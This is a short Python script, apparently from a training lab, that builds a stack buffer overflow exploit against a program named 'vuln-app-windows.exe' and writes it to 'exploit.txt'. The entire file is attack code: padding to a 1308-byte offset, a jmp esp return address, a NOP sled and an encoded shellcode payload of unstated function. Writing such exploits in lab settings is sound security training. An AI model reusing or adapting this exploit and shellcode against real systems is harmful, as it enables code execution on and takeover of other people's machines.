#!/usr/bin/env python3
import socket
import sys
from struct import pack

#BAD_CHARS = b"\x00\x0a\x12\x1a\x4e\xb1\xd5"
OFFSET = 1308
shell =  b""                                                                                                                                                                                                                                                                                 
shell += b"\x31\xc9\x83\xe9\xd0\xe8\xff\xff\xff\xff\xc0\x5e"                                                                                                                                                                                                                                 
shell += b"\x81\x76\x0e\x46\x9c\x54\x0f\x83\xee\xfc\xe2\xf4"                                                                                                                                                                                                                                 
shell += b"\xba\x74\xd6\x0f\x46\x9c\x34\x86\xa3\xad\x94\x6b"                                                                                                                                                                                                                                 
shell += b"\xcd\xcc\x64\x84\x14\x90\xdf\x5d\x52\x17\x26\x27"                                                                                                                                                                                                                                 
shell += b"\x49\x2b\x1e\x29\x77\x63\xf8\x33\x27\xe0\x56\x23"                                                                                                                                                                                                                                 
shell += b"\x66\x5d\x9b\x02\x47\x5b\xb6\xfd\x14\xcb\xdf\x5d"                                                                                                                                                                                                                                 
shell += b"\x56\x17\x1e\x33\xcd\xd0\x45\x77\xa5\xd4\x55\xde"                                                                                                                                                                                                                                 
shell += b"\x17\x17\x0d\x2f\x47\x4f\xdf\x46\x5e\x7f\x6e\x46"                                                                                                                                                                                                                                 
shell += b"\xcd\xa8\xdf\x0e\x90\xad\xab\xa3\x87\x53\x59\x0e"                                                                                                                                                                                                                                 
shell += b"\x81\xa4\xb4\x7a\xb0\x9f\x29\xf7\x7d\xe1\x70\x7a"                                                                                                                                                                                                                                 
shell += b"\xa2\xc4\xdf\x57\x62\x9d\x87\x69\xcd\x90\x1f\x84"                                                                                                                                                                                                                                 
shell += b"\x1e\x80\x55\xdc\xcd\x98\xdf\x0e\x96\x15\x10\x2b"                                                                                                                                                                                                                                 
shell += b"\x62\xc7\x0f\x6e\x1f\xc6\x05\xf0\xa6\xc3\x0b\x55"                                                                                                                                                                                                                                 
shell += b"\xcd\x8e\xbf\x82\x1b\xf6\x55\x82\xc3\x2e\x54\x0f"                                                                                                                                                                                                                                 
shell += b"\x46\xcc\x3c\x3e\xcd\xf3\xd3\xf0\x93\x27\xa4\xba"                                                                                                                                                                                                                                 
shell += b"\xe4\xca\x3c\xa9\xd3\x21\xc9\xf0\x93\xa0\x52\x73"                                                                                                                                                                                                                                 
shell += b"\x4c\x1c\xaf\xef\x33\x99\xef\x48\x55\xee\x3b\x65"
shell += b"\x46\xcf\xab\xda\x25\xf1\x30\x21\x23\xe4\x31\x0f"

# stack 1313
#badchar = x00
#7Br8
buf = b"A" * OFFSET #junk get to EIP
#buf +=b"BBBBBB" #overwrite EIP      1308 - 1313, 1308,1309,1310,1311,1312,1313
buf += pack("<I", 0x148011ba) #: jmp esp |  {PAGE_EXECUTE_READ} [vuln-app-windows.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0- (C:\Users\student\Downloads\vuln-app-windows.exe)
buf += b"\x90" *16  #NOPs to create buffer on ESP

buf += shell


f = open("exploit.txt", "wb")
f.write(buf)
f.close()